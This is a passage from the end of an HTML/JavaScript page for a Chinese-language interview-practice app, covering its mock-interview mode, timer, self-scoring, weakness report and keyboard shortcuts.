        state.activeId = next.id;
        state.open = new Set(["exp", "idea"]);
        renderAll();
        $("#main").scrollTop = 0;
      }

      /* ---------------- mock ---------------- */
      function fmt(ms) {
        const s = Math.floor(ms / 1000);
        const m = Math.floor(s / 60);
        return `${String(m).padStart(2, "0")}:${String(s % 60).padStart(2, "0")}`;
      }

      function startMock() {
        const src = pool();
        if (!src.length) return;
        const ids = src.map((q) => q.id);
        const picked = MOCK.cfg.ordered
          ? ids.slice(0, MOCK.cfg.count)
          : ids
              .map((v) => [Math.random(), v])
              .sort((a, b) => a[0] - b[0])
              .map((v) => v[1])
              .slice(0, MOCK.cfg.count);
        MOCK.run = {
          queue: picked,
          idx: 0,
          scores: {},
          revealed: false,
          finished: false,
          elapsed: 0,
        };
        MOCK.save();
        renderMain();
      }

      function report(r) {
        const byCat = new Map();
        r.queue.forEach((id) => {
          const q = QUESTIONS.find((x) => x.id === id);
          const s = r.scores[id] || 0;
          const cur = byCat.get(q.cat) || { sum: 0, n: 0 };
          cur.sum += s;
          cur.n += 1;
          byCat.set(q.cat, cur);
        });
        const scored = [...byCat.entries()]
          .map(([c, v]) => [c, v.sum / (v.n * 5)])
          .sort((a, b) => a[1] - b[1]);

        const total = r.queue.reduce((t, id) => t + (r.scores[id] || 0), 0);

        const box = el("div", { class: "sec open", style: "margin-top:30px" });
        box.appendChild(
          el("div", { class: "sec-head" }, [
            el("span", { class: "ttl", text: "评估报告" }),
          ])
        );
        const body = el("div", { class: "sec-body" });

        body.appendChild(
          el("div", { class: "prose" }, [
            el("p", {
              html:
                "共 " + r.queue.length + " 题，平均自评 <b>" +
                (total / r.queue.length).toFixed(2) + " / 5</b>。" +
                "下表按薄弱程度升序排列；低于 60% 的分类建议优先复习。",
            }),
          ])
        );

        const rep = el("div", { class: "report" });
        scored.forEach(([c, v]) => {
          rep.appendChild(
            el("div", { class: "report-row" }, [
              el("span", { class: "cname", text: c }),
              el("span", { class: "bar" }, [
                el("i", { style: `width:${Math.round(v * 100)}%` }),
              ]),
              el("span", {
                class: "num",
                text: `${Math.round(v * 100)}%`,
              }),
            ])
          );
        });
        body.appendChild(rep);

        body.appendChild(
          el("div", { style: "margin-top:20px;display:flex;gap:8px;flex-wrap:wrap" }, [
            el("button", {
              class: "action-btn",
              text: "重新开始一轮",
              onclick: () => {
                MOCK.run = null;
                MOCK.clear();
                renderMain();
              },
            }),
            el("button", {
              class: "action-btn",
              text: "回研习模式补最弱项",
              onclick: () => {
                const worst = scored[0];
                if (!worst) return;
                state.cats = new Set([worst[0]]);
                state.diffs = new Set();
                switchMode("study");
                renderAll();
              },
            }),
          ])
        );

        box.appendChild(body);
        return box;
      }

      function renderMock() {
        const wrap = el("div", { class: "wrap" });

        if (!MOCK.run) {
          const countRow = el(
            "div",
            { class: "filter-row" },
            [5, 8, 12, 20].map((n) =>
              el("button", {
                class: `chip${MOCK.cfg.count === n ? " on" : ""}`,
                text: String(n),
                onclick: () => {
                  MOCK.cfg.count = n;
                  renderMain();
                },
              })
            )
          );

          wrap.appendChild(
            el("div", { class: "mock-card" }, [
              el("h2", { class: "q-title", text: "模拟面试" }),
              el("div", {
                class: "prose",
                html:
                  "<p>从题库中按分类与难度抽题，逐题口述作答，然后自评。" +
                  "<b>建议先关掉答案再开口</b>——能讲出「为什么」比讲出「是什么」重要得多。</p>" +
                  "<p>当前筛选池：<b>" + pool().length + "</b> 题" +
                  (state.cats.size || state.diffs.size || state.search
                    ? "（受侧栏筛选影响）"
                    : "") +
                  "</p>",
              }),
              el("div", { class: "mock-bar", style: "margin-top:22px" }, [
                el("span", { class: "label", text: "题量" }),
                countRow,
                el("span", {
                  class: "label",
                  text: "分类",
                  style: "margin-left:14px",
                }),
                el(
                  "select",
                  {
                    class: "search-box",
                    style: "width:auto",
                    onchange: (e) => {
                      MOCK.cfg.cat = e.target.value;
                      renderMain();
                    },
                  },
                  ["全部", ...CATS].map((c) =>
                    el(
                      "option",
                      { value: c, selected: MOCK.cfg.cat === c },
                      [c]
                    )
                  )
                ),
                el("span", {
                  class: "label",
                  text: "难度",
                  style: "margin-left:14px",
                }),
                el(
                  "select",
                  {
                    class: "search-box",
                    style: "width:auto",
                    onchange: (e) => {
                      MOCK.cfg.diff = e.target.value;
                      renderMain();
                    },
                  },
                  ["全部", "1", "2", "3"].map((c) =>
                    el(
                      "option",
                      {
                        value: c,
                        selected: String(MOCK.cfg.diff) === c,
                      },
                      [
                        c === "1"
                          ? "基础"
                          : c === "2"
                          ? "进阶"
                          : c === "3"
                          ? "深入"
                          : "全部",
                      ]
                    )
                  )
                ),
                el("span", { class: "spacer" }),
                el("button", {
                  class: "action-btn",
                  text: MOCK.cfg.ordered ? "顺序出题" : "随机出题",
                  onclick: () => {
                    MOCK.cfg.ordered = !MOCK.cfg.ordered;
                    renderMain();
                  },
                }),
              ]),
              el("div", { style: "margin-top:20px" }, [
                el("button", {
                  class: "action-btn primary",
                  text: "开始模拟面试 →",
                  onclick: startMock,
                }),
              ]),
            ])
          );
          return wrap;
        }

        const r = MOCK.run;
        const q = QUESTIONS.find((x) => x.id === r.queue[r.idx]);
        const card = el("div", { class: "mock-card" });

        card.appendChild(
          el("div", { class: "mock-bar" }, [
            el("span", {
              class: "label",
              text: `${r.idx + 1} / ${r.queue.length}`,
            }),
            el("span", { class: "badge cat", text: q.cat }),
            el("span", {
              class: `badge d${q.diff}`,
              text: DIFF_LABEL[q.diff],
            }),
            el("span", { class: "mock-timer run", text: fmt(r.elapsed) }),
          ])
        );

        card.appendChild(el("h2", { class: "q-title", html: q.q }));
        const src = srcLine(q);
        if (src) card.appendChild(src);

        if (r.revealed) {
          const body = el("div", {
            class: "prose",
            style: "margin-top:22px",
          });
          body.innerHTML = q.idea + q.ans;
          card.appendChild(body);
          if (q.follow) {
            const f = el("div", { class: "prose", style: "margin-top:18px" });
            f.innerHTML =
              `<h4>追问与陷阱</h4>${q.follow.replace(/<h4>[\s\S]*?<\/h4>/, "")}`;
            card.appendChild(f);
          }
        } else {
          card.appendChild(
            el("div", {
              class: "home-note",
              style: "margin-top:20px",
              html:
                "<b>先自己作答。</b>推荐结构：先给结论，再讲取舍，最后讲失败模式。" +
                "答完再展开对照参考答案。",
            })
          );
        }

        const foot = el("div", {
          class: "mock-bar",
          style:
            "margin-top:26px;margin-bottom:0;border-bottom:none;" +
            "border-top:1px solid var(--line);padding-top:18px;padding-bottom:0",
        });
        foot.appendChild(el("span", { class: "label", text: "自评" }));
        foot.appendChild(
          el("div", { class: "score-row" }, [1, 2, 3, 4, 5].map((s) =>
            el("button", {
              class: `score-btn${r.scores[q.id] === s ? " on" : ""}`,
              "data-s": String(s),
              text: ["不会", "不熟", "能讲", "熟练", "可深挖"][s - 1],
              onclick: () => {
                r.scores[q.id] = s;
                MOCK.save();
                renderMain();
              },
            })
          ))
        );
        foot.appendChild(el("span", { class: "spacer" }));
        if (!r.revealed) {
          foot.appendChild(
            el("button", {
              class: "action-btn primary",
              text: "展开参考思路与答案",
              onclick: () => {
                r.revealed = true;
                MOCK.save();
                renderMain();
              },
            })
          );
        } else {
          foot.appendChild(
            el("button", {
              class: "action-btn primary",
              text: r.idx + 1 < r.queue.length ? "下一题 →" : "生成评估报告",
              onclick: () => {
                if (r.idx + 1 < r.queue.length) {
                  r.idx += 1;
                  r.revealed = false;
                } else {
                  r.finished = true;
                }
                MOCK.save();
                renderMain();
              },
            })
          );
        }
        card.appendChild(foot);

        wrap.appendChild(card);
        wrap.appendChild(
          el("div", { class: "pager" }, [
            el("button", {
              class: "action-btn",
              text: "退出模拟",
              onclick: () => {
                MOCK.run = null;
                MOCK.clear();
                renderMain();
              },
            }),
            el("span", {
              class: "mini",
              text: "进度自动保存，可刷新继续",
            }),
          ])
        );

        if (r.finished) wrap.appendChild(report(r));
        return wrap;
      }

      /* ---------------- timer ---------------- */
      setInterval(() => {
        if (state.mode !== "mock" || !MOCK.run || MOCK.run.finished) return;
        MOCK.run.elapsed += 1000;
        const t = document.querySelector(".mock-timer");
        if (t) t.textContent = fmt(MOCK.run.elapsed);
      }, 1000);

      /* ---------------- render ---------------- */
      function renderMain() {
        const m = $("#main");
        const top = m.scrollTop;
        m.textContent = "";
        m.appendChild(state.mode === "study" ? renderStudy() : renderMock());
        m.scrollTop = state.mode === "study" ? top : 0;
      }

      function renderAll() {
        /* 筛选后若当前题不在可见集合内，主视图必须跟随到第一道可见题，
           否则侧栏高亮为空而主区显示一道列表里看不到的题。 */
        const items = visible();
        if (items.length && !items.some((q) => q.id === state.activeId)) {
          state.activeId = items[0].id;
          state.open = new Set(["exp", "idea"]);
        }
        renderFilters();
        renderList();
        renderStats();
        renderMain();
      }

      function switchMode(mode) {
        state.mode = mode;
        $("#modeStudy").classList.toggle("active", mode === "study");
        $("#modeMock").classList.toggle("active", mode === "mock");
        if (mode === "mock" && !MOCK.run) MOCK.run = MOCK.load();
        renderMain();
      }

      $("#modeStudy").addEventListener("click", () => switchMode("study"));
      $("#modeMock").addEventListener("click", () => switchMode("mock"));
      $("#searchBox").addEventListener("input", (e) => {
        state.search = e.target.value;
        renderList();
        renderStats();
      });
      $("#resetBtn").addEventListener("click", () => {
        state.done = new Set();
        store.write([]);
        renderAll();
      });

      document.addEventListener("keydown", (e) => {
        const typing =
          e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA";
        if (e.key === "/" && !typing) {
          e.preventDefault();
          $("#searchBox").focus();
          return;
        }
        if (e.key === "Escape") {
          $("#searchBox").blur();
          return;
        }
        if (typing) return;
        if (state.mode !== "study") return;
        const i = QUESTIONS.findIndex((q) => q.id === state.activeId);
        if (e.key === "j" || e.key === "J") jump(i + 1);
        if (e.key === "k" || e.key === "K") jump(i - 1);
        if (e.key === "a" || e.key === "A") {
          state.open.has("ans")
            ? state.open.delete("ans")
            : state.open.add("ans");
          renderMain();
        }
        if (e.key === "m" || e.key === "M") {
          const q = QUESTIONS.find((x) => x.id === state.activeId);
          if (!q) return;
          state.done.has(q.id)
            ? state.done.delete(q.id)
            : state.done.add(q.id);
          store.write([...state.done]);
          renderAll();
        }
      });

      if (MOCK.load()) {
        state.mode = "mock";
        $("#modeMock").classList.add("active");
        $("#modeStudy").classList.remove("active");
      }
      renderAll();
    </script>
  </body>
</html>
